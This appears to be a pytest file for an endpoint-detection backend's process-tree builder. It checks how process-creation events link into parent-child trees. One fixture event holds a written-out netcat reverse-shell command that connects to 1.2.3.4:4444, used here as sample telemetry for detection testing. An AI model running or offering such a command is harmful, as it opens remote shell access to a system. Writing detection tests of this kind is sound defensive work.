from edr_backend.correlation.process_tree import build_process_tree


def _event(pid, ppid=None, name=None, cmdline=None, time="2026-07-08T10:00:00+00:00",
           event_id=None, parent=None, user=None):
    proc = {"pid": pid, "ppid": ppid, "name": name, "cmdline": cmdline}
    if parent:
        proc["parent"] = parent
    if user:
        proc["user"] = {"name": user}
    return {
        "event_id": event_id or f"ev-{pid}",
        "time": time,
        "event_type": "process_create",
        "process": proc,
    }


def test_simple_chain_builds_nested_tree():
    events = [
        _event(100, ppid=None, name="bash", time="2026-07-08T10:00:00+00:00"),
        _event(200, ppid=100, name="nc", cmdline="nc -e /bin/sh 1.2.3.4 4444",
               time="2026-07-08T10:00:05+00:00"),
        _event(300, ppid=200, name="sh", time="2026-07-08T10:00:06+00:00"),
    ]
    roots = build_process_tree(events)
    assert len(roots) == 1
    assert roots[0]["name"] == "bash"
    assert roots[0]["children"][0]["name"] == "nc"
    assert roots[0]["children"][0]["children"][0]["name"] == "sh"


def test_unobserved_parent_becomes_synthetic_root():
    events = [
        _event(200, ppid=100, name="sh",
               parent={"pid": 100, "name": "apache2", "cmdline": "/usr/sbin/apache2"}),
    ]
    roots = build_process_tree(events)
    assert len(roots) == 1
    root = roots[0]
    assert root["pid"] == 100
    assert root["name"] == "apache2"
    assert root["event_id"] is None  # synthetic: never had its own create event
    assert root["children"][0]["name"] == "sh"


def test_independent_processes_are_separate_roots():
    events = [
        _event(100, name="cron"),
        _event(200, name="sshd"),
    ]
    roots = build_process_tree(events)
    assert {r["name"] for r in roots} == {"cron", "sshd"}


def test_events_out_of_order_still_link():
    events = [
        _event(200, ppid=100, name="child", time="2026-07-08T10:00:05+00:00"),
        _event(100, name="parent", time="2026-07-08T10:00:00+00:00"),
    ]
    roots = build_process_tree(events)
    assert len(roots) == 1
    assert roots[0]["name"] == "parent"
    assert roots[0]["event_id"] == "ev-100"  # real event, not synthetic
    assert roots[0]["children"][0]["name"] == "child"


def test_self_parent_does_not_recurse():
    roots = build_process_tree([_event(100, ppid=100, name="weird")])
    assert len(roots) == 1
    assert roots[0]["children"] == []


def test_missing_pid_is_skipped():
    event = {"event_id": "e1", "time": "2026-07-08T10:00:00+00:00",
             "event_type": "process_create", "process": {"pid": None}}
    assert build_process_tree([event]) == []
